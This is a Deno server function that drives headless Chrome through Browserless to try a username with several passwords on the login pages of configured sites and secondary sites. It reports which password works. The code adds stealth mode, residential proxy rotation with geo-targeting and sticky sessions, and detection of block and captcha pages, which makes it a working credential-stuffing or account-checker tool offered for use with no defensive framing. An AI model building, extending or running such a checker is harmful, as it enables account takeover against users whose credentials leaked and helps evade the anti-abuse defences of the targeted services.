import { createClientFromRequest } from 'npm:@base44/sdk@0.8.25';

const DEFAULT_SUCCESS_SELECTOR = '.ol-alert__content.ol-alert__content--status_success';
const BLOCK_MARKERS = ['/blocked', '/error', '/access-denied', '/forbidden', '/captcha', '/challenge'];

// ------------ Settings / proxy resolution ------------
async function loadSettings(base44) {
  const rows = await base44.asServiceRole.entities.AppSettings.list('-created_date', 1);
  return rows[0] || {};
}

async function resolveProxy(base44, runProxy, settings) {
  const mode = runProxy?.proxy_mode || settings.proxy_mode || 'residential';
  const out = {
    mode,
    country_code: (runProxy?.country_code || settings.country_code || 'au').toLowerCase(),
    proxy_city: runProxy?.proxy_city || settings.proxy_city,
    sticky: runProxy?.proxy_sticky ?? settings.proxy_sticky ?? true,
    locale_match: runProxy?.proxy_locale_match ?? settings.proxy_locale_match ?? true,
    preset: runProxy?.proxy_preset || settings.proxy_preset || 'none',
    external: null,
  };
  if (mode === 'external') {
    const id = runProxy?.external_proxy_id || settings.external_proxy_id;
    if (id) {
      const rows = await base44.asServiceRole.entities.Proxy.filter({ id });
      const p = rows[0];
      if (p) out.external = p;
    }
  }
  return out;
}

// ------------ Browserless URL builder ------------
function buildBrowserlessUrl(settings, proxy) {
  const region = settings.browserless_region || 'production-sfo';
  const token = Deno.env.get('BROWSERLESS_TOKEN');
  const params = new URLSearchParams({ token });

  // Launch options
  const launch = {
    stealth: settings.stealth ?? true,
    headless: settings.headless ?? true,
    blockAds: settings.block_ads ?? true,
    blockConsentModals: settings.block_consent_modals ?? true,
  };
  if (settings.slow_mo_ms) launch.slowMo = settings.slow_mo_ms;
  if (settings.viewport_width || settings.viewport_height) {
    launch.args = [`--window-size=${settings.viewport_width || 1366},${settings.viewport_height || 768}`];
  }
  params.set('launch', JSON.stringify(launch));

  // Timeout
  if (settings.timeout_ms) params.set('timeout', String(settings.timeout_ms));

  // Proxy routing
  if (proxy.mode === 'residential') {
    params.set('proxy', 'residential');
    if (proxy.country_code) params.set('proxyCountry', proxy.country_code);
    if (proxy.proxy_city) params.set('proxyCity', proxy.proxy_city);
    if (proxy.sticky) params.set('proxySticky', 'true');
    if (proxy.locale_match) params.set('proxyLocaleMatch', 'true');
    if (proxy.preset && proxy.preset !== 'none') params.set('proxyPreset', proxy.preset);
  } else if (proxy.mode === 'external' && proxy.external) {
    const { host, port, protocol, username, password } = proxy.external;
    if (host && port) {
      const scheme = protocol || 'http';
      const auth = username ? `${encodeURIComponent(username)}${password ? `:${encodeURIComponent(password)}` : ''}@` : '';
      params.set('externalProxyServer', `${scheme}://${auth}${host}:${port}`);
    }
  }
  // 'datacenter' and 'none' → no proxy params (uses datacenter IP)

  return `https://${region}.browserless.io/function?${params.toString()}`;
}

// ------------ Puppeteer script (runs on Browserless) ------------
// Returns { status, final_url, marker_found, error, attempts_tried, working_password }
const LOGIN_SCRIPT = `
export default async ({ page, context }) => {
  const {
    site, username, passwords, strategy, userAgent, viewportW, viewportH
  } = context;

  const attempts = [];
  try {
    if (userAgent) await page.setUserAgent(userAgent);
    if (viewportW && viewportH) await page.setViewport({ width: viewportW, height: viewportH });

    const tried = [];
    let winner = null;
    let lastFinalUrl = null;
    let lastMarker = false;
    let lastError = null;

    const runOne = async (pw) => {
      tried.push(pw.length);
      try {
        await page.goto(site.url, { waitUntil: 'networkidle2', timeout: 45000 });
      } catch (e) {
        return { status: 'error', error: 'navigation: ' + e.message };
      }

      const userSel = site.username_selector || "input[type='email'], input[name='username']";
      const passSel = site.password_selector || "input[type='password']";
      const submitSel = site.submit_selector || "button[type='submit']";

      try {
        await page.waitForSelector(userSel, { timeout: 15000 });
      } catch (e) {
        return { status: 'error', error: 'username field not found' };
      }

      // Clear and type
      await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, userSel);
      await page.type(userSel, username, { delay: 25 });

      await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, passSel);
      await page.type(passSel, pw, { delay: 25 });

      const nav = page.waitForNavigation({ waitUntil: 'networkidle2', timeout: (site.wait_after_submit_ms || 3500) + 6000 }).catch(() => null);
      try { await page.click(submitSel); } catch (_) {
        await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.click(); }, submitSel);
      }
      await nav;
      await new Promise(r => setTimeout(r, site.wait_after_submit_ms || 2500));

      const successSel = site.success_selector || ${JSON.stringify(DEFAULT_SUCCESS_SELECTOR)};
      const { marker, url } = await page.evaluate((sel) => {
        const el = document.querySelector(sel);
        const visible = !!el && (el.offsetParent !== null || (el.getBoundingClientRect && el.getBoundingClientRect().height > 0));
        return { marker: visible, url: location.href };
      }, successSel);

      lastFinalUrl = url; lastMarker = marker;

      const lower = (url || '').toLowerCase();
      const blocked = ${JSON.stringify(BLOCK_MARKERS)}.some(m => lower.includes(m));
      const loginMarker = (site.login_url_marker || '/login').toLowerCase();
      const stayedLogin = loginMarker ? lower.includes(loginMarker) : false;
      const successUrl = site.success_url_contains ? lower.includes(site.success_url_contains.toLowerCase()) : false;

      // Strict by default: require an explicit success signal (marker visible OR success URL match).
      // Sites can opt in to the old lenient behaviour ("left login page and wasn't blocked") via site.lenient_success.
      if (marker || successUrl) {
        return { status: 'working', final_url: url, marker, working_password: pw };
      }
      if (site.lenient_success && !stayedLogin && !blocked) {
        return { status: 'working', final_url: url, marker, working_password: pw };
      }
      return { status: 'failed', final_url: url, marker };
    };

    const list = passwords.slice(0, strategy === 'single' ? 1 : passwords.length);
    for (const pw of list) {
      const r = await runOne(pw);
      attempts.push({ len: pw.length, status: r.status, final_url: r.final_url });
      if (r.status === 'working') { winner = r; if (strategy !== 'all_passwords') break; }
      if (r.status === 'error') { lastError = r.error; if (strategy === 'single') break; }
    }

    if (winner) {
      return { data: { status: 'working', final_url: winner.final_url, marker_found: true, working_password: winner.working_password, attempts }, type: 'application/json' };
    }
    if (lastError && tried.length === 1) {
      return { data: { status: 'error', error: lastError, attempts }, type: 'application/json' };
    }
    return { data: { status: 'failed', final_url: lastFinalUrl, marker_found: lastMarker, attempts }, type: 'application/json' };
  } catch (e) {
    return { data: { status: 'error', error: e.message, attempts }, type: 'application/json' };
  }
};
`;

async function runBrowserless(settings, proxy, site, loginUrl, username, passwords, strategy) {
  const url = buildBrowserlessUrl(settings, proxy);
  const context = {
    site: {
      url: loginUrl,
      username_selector: site.username_selector,
      password_selector: site.password_selector,
      submit_selector: site.submit_selector,
      success_selector: site.success_selector,
      login_url_marker: site.login_url_marker,
      success_url_contains: site.success_url_contains,
      wait_after_submit_ms: site.wait_after_submit_ms,
      lenient_success: !!site.lenient_success,
    },
    username,
    passwords,
    strategy,
    userAgent: settings.user_agent,
    viewportW: settings.viewport_width,
    viewportH: settings.viewport_height,
  };

  const started = Date.now();
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ code: LOGIN_SCRIPT, context }),
  });
  const elapsed = Date.now() - started;

  if (!res.ok) {
    const text = await res.text();
    return {
      site_key: site.key, status: 'error',
      error_message: `Browserless ${res.status}: ${text.slice(0, 300)}`,
      elapsed_ms: elapsed,
    };
  }

  const json = await res.json();
  const payload = json?.data || json;
  return {
    site_key: site.key,
    status: payload.status || 'error',
    final_url: payload.final_url,
    success_marker_found: !!payload.marker_found,
    working_password: payload.working_password,
    error_message: payload.error,
    elapsed_ms: elapsed,
  };
}

function combine(perSite) {
  const anyWorking = perSite.find((r) => r.status === 'working');
  if (anyWorking) return {
    status: 'working',
    final_url: anyWorking.final_url,
    success_marker_found: true,
    working_password: anyWorking.working_password,
    elapsed_ms: perSite.reduce((a, b) => a + (b.elapsed_ms || 0), 0),
    per_site: perSite,
  };
  const anyFailed = perSite.find((r) => r.status === 'failed');
  if (anyFailed) return {
    status: 'failed',
    final_url: anyFailed.final_url,
    success_marker_found: false,
    elapsed_ms: perSite.reduce((a, b) => a + (b.elapsed_ms || 0), 0),
    per_site: perSite,
  };
  return {
    status: 'error',
    error_message: perSite.map((r) => `${r.site_key}: ${r.error_message || 'unknown'}`).join(' | '),
    elapsed_ms: perSite.reduce((a, b) => a + (b.elapsed_ms || 0), 0),
    per_site: perSite,
  };
}

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const user = await base44.auth.me();
    if (!user) return Response.json({ error: 'Unauthorized' }, { status: 401 });

    const body = await req.json();
    const {
      username, password, extra_passwords, site_key,
      target_site_keys, custom_url,
      proxy: runProxy, strategy: runStrategy,
    } = body;

    if (!username || !password || !site_key) {
      return Response.json({ error: 'Missing username/password/site_key' }, { status: 400 });
    }

    const token = Deno.env.get('BROWSERLESS_TOKEN');
    if (!token) return Response.json({ error: 'BROWSERLESS_TOKEN not set' }, { status: 500 });

    const settings = await loadSettings(base44);
    const strategy = runStrategy || settings.default_login_strategy || 'multi_password';

    // Build password list
    const passwords = [password];
    if (Array.isArray(extra_passwords)) for (const p of extra_passwords) if (p && !passwords.includes(p)) passwords.push(p);

    // Resolve site
    const sites = await base44.asServiceRole.entities.Site.filter({ key: site_key });
    const site = sites[0];
    if (!site) return Response.json({ error: `Unknown site: ${site_key}` }, { status: 404 });

    // Target sites
    const testSites = [];
    if (Array.isArray(target_site_keys) && target_site_keys.length > 0) {
      for (const k of target_site_keys) {
        const f = await base44.asServiceRole.entities.Site.filter({ key: k });
        if (f[0]) testSites.push(f[0]);
      }
    } else {
      if (!site.skip_primary && site.login_url) testSites.push(site);
      for (const k of (site.secondary_site_keys || [])) {
        const f = await base44.asServiceRole.entities.Site.filter({ key: k });
        if (f[0]) testSites.push(f[0]);
      }
    }
    if (testSites.length === 0) {
      return Response.json({ status: 'error', error_message: `No testable sites for ${site_key}` });
    }

    const proxy = await resolveProxy(base44, runProxy, settings);

    const results = [];
    for (const s of testSites) {
      const loginUrl = custom_url || s.login_url;
      if (!loginUrl) {
        results.push({ site_key: s.key, status: 'error', error_message: 'No login_url', elapsed_ms: 0 });
        continue;
      }
      results.push(await runBrowserless(settings, proxy, s, loginUrl, username, passwords, strategy));
    }

    if (results.length === 1) {
      const r = results[0];
      return Response.json({
        status: r.status,
        final_url: r.final_url,
        success_marker_found: r.success_marker_found,
        working_password: r.working_password,
        error_message: r.error_message,
        elapsed_ms: r.elapsed_ms,
      });
    }
    return Response.json(combine(results));
  } catch (error) {
    return Response.json({ status: 'error', error_message: error.message }, { status: 500 });
  }
});